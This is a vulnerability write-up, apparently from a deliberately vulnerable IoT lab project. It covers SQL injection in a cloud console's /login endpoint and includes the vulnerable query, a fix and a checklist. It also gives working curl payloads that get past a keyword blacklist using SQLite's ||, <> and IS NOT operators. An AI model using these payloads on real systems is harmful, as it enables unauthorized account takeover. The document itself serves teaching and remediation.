---
id: API10:2023
title: "Unsafe Consumption of APIs — Login Input SQL Injection"
category: API
status: IN PROGRESS
severity: High
owasp: "API10:2023 Unsafe Consumption of APIs"
cwe: "CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)"
source_docs:
  - "src/cloud_api/octobot/app.py §/login"
  - "src/cloud_api/octobot/services/auth_service.py §verify_user"
affected_components:
  - "cloud_api/octobot/services/auth_service.py"
  - "cloud_api/octobot/app.py"
verified_date: ""
---

## Why It Matters

The OctoBot cloud console `/login` endpoint receives operator credentials through the public HTTP API and passes them straight into a raw SQL query. The application unsafely consumes untrusted input from its own client-facing API without proper validation or parameterization. A weak blacklist filter attempts to block SQL injection, but common tutorial payloads using `--`, `;`, `UNION`, and `OR` are rejected while SQLite-specific alternatives such as the string-concatenation operator `||` combined with `<>` or `IS NOT`, as well as `LIKE` wildcards, remain usable.

An attacker who discovers the filter can log in as the operator without knowing the username or the password, gaining full access to the cloud console and the ability to send commands to the Pi through the authenticated `/api/servo`, `/api/command`, and `/api/v2/firmware` endpoints.

## Root Cause

```python
# cloud_api/octobot/services/auth_service.py
query = (
    f"SELECT username FROM users WHERE username = '{safe_username}' "
    f"AND password = '{safe_password}'"
)
row = con.execute(query).fetchone()
```

The query is assembled with f-strings. A `_sanitize` helper blocks substrings such as `--`, `/*`, `*/`, `;`, and whole-word SQL keywords (`UNION`, `SELECT`, `OR`, `AND`, etc.), but it misses:

- `||` — SQLite string concatenation
- `<>` — SQLite not-equal operator
- `IS NOT` — boolean comparison
- `LIKE` — pattern matching with `%` wildcard

Because the password is stored and compared in plaintext, any injection that makes the `WHERE` clause evaluate to true returns the operator row and creates a valid session.

## Steps to Reproduce

### Normal login

```bash
curl -s -X POST http://localhost:5003/login \
  -d 'username=operator' -d 'password=octobot' -c session.jar
# -> 302 redirect to /
```

### Blocked classic payload

```bash
curl -s -X POST http://localhost:5003/login \
  -d "username=operator" -d "password=' OR '1'='1" -c session.jar
# -> 401 Invalid credentials (blocked by the OR keyword filter)
```

### Bypass with a known username

```bash
curl -s -X POST http://localhost:5003/login \
  -d "username=operator" -d "password=' || 'x' <> 'y" -c session.jar
# -> 302 redirect to / (logged in as operator)
```

The injected password becomes:

```sql
password = '' || 'x' <> 'y'
```

SQLite evaluates `'x' <> 'y'` as true, so the clause matches every row.

![[api10_sqlinjection_burpsuite.png]]

### Bypass without knowing the username

```bash
curl -s -X POST http://localhost:5003/login \
  -d "username=' IS NOT 'a" -d "password=' || 'x' <> 'y" -c session.jar
# -> 302 redirect to / (logged in as operator)
```

The injected username becomes:

```sql
username = '' IS NOT 'a'
```

`(username = '')` evaluates to `0` or `1`, and `0 IS NOT 'a'` / `1 IS NOT 'a'` are both true, so the username clause is always true. Combined with the password bypass, the attacker does not need to know any valid account name.

![[api10_username_injection_burpsuite.png]]

We bypass the login panel by using the cookie obtained.

![[api10_using_cookie.png]]

## Expected Result

An unauthenticated attacker can obtain an operator session by submitting username and password payloads that bypass the blacklist, without knowing the real operator username or password.

## How It Should Be

Use parameterized queries for both fields and remove the blacklist. Passwords should be hashed with a strong, salted algorithm such as `pbkdf2:sha256` or `scrypt`, and verification should compare hashes through the parameter binding.

```python
row = con.execute(
    'SELECT pw_hash FROM users WHERE username = ?', (username,)
).fetchone()
return bool(row) and check_password_hash(row[0], password)
```

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Input validation | Parameterized queries with bound variables | Prevent SQL injection entirely |
| Cryptography | Store salted password hashes, never plaintext | Limit impact of database read |
| Defense in depth | Web Application Firewall rules as a complement, not a replacement | Catch obvious payloads without relying on filters for security |
| Test coverage | Automated tests for normal login, wrong password, and injection payloads | Ensure the fix does not regress |

## Verification Checklist

- [ ] Normal login with `operator` / `octobot` succeeds
- [ ] Wrong password returns 401
- [ ] Classic payloads with `--`, `;`, `UNION`, `OR` return 401
- [ ] Bypass payloads with `||`, `<>`, `IS NOT`, or `LIKE` return 401 after the fix
- [ ] No plaintext password column exists in the database

## Related Vulnerabilities

- [API5:2023 — Broken Function Level Authorization](API5_Broken_Function_Level_Authorization.md): an attacker who bypasses `/login` can reach the authenticated v2 firmware endpoint.
- [IoT:I4 — Lack of Secure Update Mechanism](../IoT/IoT4_Lack_of_Secure_Update_Mechanism.md): the authenticated `/api/v2/firmware` path allows firmware replacement on the Pi.
- [IoT:I1 — Weak, Guessable, or Hardcoded Passwords](../IoT/IoT1_Weak_Guessable_Hardcoded_Passwords.md): the operator account uses a seeded default credential that an attacker can also try before attempting injection.
